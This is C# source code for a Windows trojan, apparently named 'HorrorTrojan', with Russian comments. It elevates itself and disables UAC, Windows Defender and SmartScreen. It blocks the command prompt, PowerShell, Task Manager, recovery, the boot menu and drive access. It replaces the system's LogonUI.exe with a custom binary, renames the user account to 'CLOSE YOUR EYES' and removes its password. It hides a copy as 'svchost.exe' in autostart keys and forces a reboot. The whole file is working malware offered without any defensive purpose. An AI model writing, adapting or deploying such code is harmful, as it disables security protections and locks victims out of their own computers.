using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using HorrorTrojan;

namespace LogonUIInstaller
{
    internal static class Program
    {
        private static Mutex mutex;
        private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
        private static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");

        [STAThread]
        static void Main(string[] args)
        {
            bool createdNew;
            mutex = new Mutex(true, "Global\\LogonUIInstallerMutex", out createdNew);
            if (!createdNew) return;

            try
            {
                if (args.Length > 0 && args[0] == "stage2")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);

                    ReplaceLogonUI();
                    Application.Run(new MainInterface());
                    return;
                }

                if (!IsElevated())
                {
                    RestartAsAdmin();
                    return;
                }

                ExtractAllResources();
                ApplySystemBlocks();
                DisableAntivirusAndUAC();
                ApplySettingsToDefaultProfile();
                RenameCurrentUser();  // ← НОВЫЙ МЕТОД
                AddToStartupWithStage2();
                ForceReboot();
            }
            finally
            {
                mutex?.ReleaseMutex();
                mutex?.Dispose();
            }
        }

        // ==================== РАСПАКОВКА РЕСУРСОВ ====================
        private static void ExtractAllResources()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                ExtractResource("hr.gif", Path.Combine(appDataPath, "hr.gif"));
                ExtractResource("dv.mp3", Path.Combine(appDataPath, "dv.mp3"));
                ExtractResource("vd.gif", Path.Combine(appDataPath, "vd.gif"));
                ExtractResource("kj.gif", Path.Combine(appDataPath, "kj.gif"));
                ExtractResource("kf.gif", Path.Combine(appDataPath, "kf.gif"));
                ExtractResource("wd.webp", Path.Combine(appDataPath, "wd.webp"));
                ExtractResource("fg.ani", Path.Combine(appDataPath, "fg.ani"));
                ExtractResource("LogonUI.exe", Path.Combine(appDataPath, "LogonUI.exe"));

                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                foreach (string file in Directory.GetFiles(appDataPath))
                    File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.ReadOnly);
            }
            catch { }
        }

        private static void ExtractResource(string name, string outputPath)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                {
                    if (stream == null) return;
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    File.WriteAllBytes(outputPath, data);
                }
            }
            catch { }
        }

        // ==================== ЗАМЕНА LogonUI ====================
        private static void ReplaceLogonUI()
        {
            try
            {
                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                if (!File.Exists(originalPath)) return;

                ForceFullAccess(originalPath);
                KillLogonUIProcesses();

                File.SetAttributes(originalPath, FileAttributes.Normal);
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        File.Delete(originalPath);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        try
                        {
                            File.Move(originalPath, originalPath + ".del");
                            File.Delete(originalPath + ".del");
                            break;
                        }
                        catch { }
                    }
                }

                byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                File.WriteAllBytes(originalPath, customLogonUI);
            }
            catch { }
        }

        private static byte[] ExtractResourceBytes(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
            {
                if (stream == null) throw new Exception($"Resource {resourceName} not found");
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }

        private static void ForceFullAccess(string path)
        {
            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                FileInfo fi = new FileInfo(path);
                FileSecurity fs = fi.GetAccessControl();
                fs.SetOwner(WindowsIdentity.GetCurrent().User);
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount(Environment.UserDomainName, Environment.UserName),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("NT AUTHORITY\\SYSTEM"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fi.SetAccessControl(fs);
            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("LogonUI"))
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
                            p.MainModule.FileName.Contains("System32"))
                        {
                            p.Kill();
                            p.WaitForExit(3000);
                            Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ==================== УСТАНОВЩИК ====================
        private static bool IsElevated()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RestartAsAdmin()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetEntryAssembly().Location,
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ForceReboot()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/r /f /t 0",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ApplySystemBlocks()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);

                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);
                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                    key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                    key.SetValue("OptionValue", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
                {
                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableAntivirusAndUAC()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        // ==================== НАСТРОЙКИ DEFAULT ПРОФИЛЯ ====================
        private static void ApplySettingsToDefaultProfile()
        {
            try
            {
                string defaultProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", "Default", "NTUSER.DAT");
                if (!File.Exists(defaultProfilePath)) return;

                string tempKey = "DefaultUserTemp_" + Guid.NewGuid().ToString("N").Substring(0, 8);

                Process p1 = Process.Start(new ProcessStartInfo
                {
                    FileName = "reg",
                    Arguments = $"load \"HKEY_USERS\\{tempKey}\" \"{defaultProfilePath}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p1?.WaitForExit(3000);
                p1?.Close();

                ApplyRegistrySettingsToHive(tempKey);

                Process p2 = Process.Start(new ProcessStartInfo
                {
                    FileName = "reg",
                    Arguments = $"unload \"HKEY_USERS\\{tempKey}\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p2?.WaitForExit(3000);
                p2?.Close();

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
                {
                    key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE"))
                {
                    key.SetValue("SkipMachineOOBE", 1, RegistryValueKind.DWord);
                    key.SetValue("SkipUserOOBE", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void ApplyRegistrySettingsToHive(string hiveKey)
        {
            try
            {
                string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
                string cursorPath = Path.Combine(appDataPath, "fg.ani");
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{hiveKey}\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                }
            }
            catch { }
        }

        // ==================== ПЕРЕИМЕНОВАНИЕ ПОЛЬЗОВАТЕЛЯ ====================
        private static void RenameCurrentUser()
        {
            try
            {
                string currentUser = Environment.UserName;
                string newUser = "CLOSE YOUR EYES";

                // 1. Переименовываем пользователя
                Process p1 = Process.Start(new ProcessStartInfo
                {
                    FileName = "wmic",
                    Arguments = $"useraccount where name='{currentUser}' rename '{newUser}'",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p1?.WaitForExit(5000);
                p1?.Close();

                // 2. Убираем пароль
                Process p2 = Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user \"{newUser}\" \"\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p2?.WaitForExit(3000);
                p2?.Close();

                // 3. Переименовываем папку профиля
                string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
                string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
                
                if (Directory.Exists(oldProfilePath) && !Directory.Exists(newProfilePath))
                {
                    // Переименовываем папку
                    Directory.Move(oldProfilePath, newProfilePath);
                    
                    // Обновляем путь в реестре
                    string sid = GetUserSID(newUser);
                    if (!string.IsNullOrEmpty(sid))
                    {
                        using (var key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}", true))
                        {
                            if (key != null)
                            {
                                key.SetValue("ProfileImagePath", newProfilePath, RegistryValueKind.ExpandString);
                            }
                        }
                    }
                }

                // 4. Добавляем Active Setup для первого входа (гарантия)
                string guid = Guid.NewGuid().ToString("B").ToUpper();
                using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                {
                    key.SetValue("", "SystemUpdate", RegistryValueKind.String);
                    key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
                    key.SetValue("Version", "1.0", RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static string GetUserSID(string username)
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"))
                {
                    foreach (string sid in key.GetSubKeyNames())
                    {
                        using (var subKey = key.OpenSubKey(sid))
                        {
                            string profilePath = subKey.GetValue("ProfileImagePath") as string;
                            if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
                            {
                                return sid;
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        // ==================== УСТАНОВКА АВТОЗАПУСКА ====================
        private static void AddToStartupWithStage2()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                string selfPath = Assembly.GetEntryAssembly().Location;
                string destPath = Path.Combine(appDataPath, "svchost.exe");
                
                if (File.Exists(selfPath))
                {
                    if (File.Exists(destPath))
                        File.Delete(destPath);
                    File.Copy(selfPath, destPath, true);
                }

                File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
            }
            catch { }
        }
    }
}
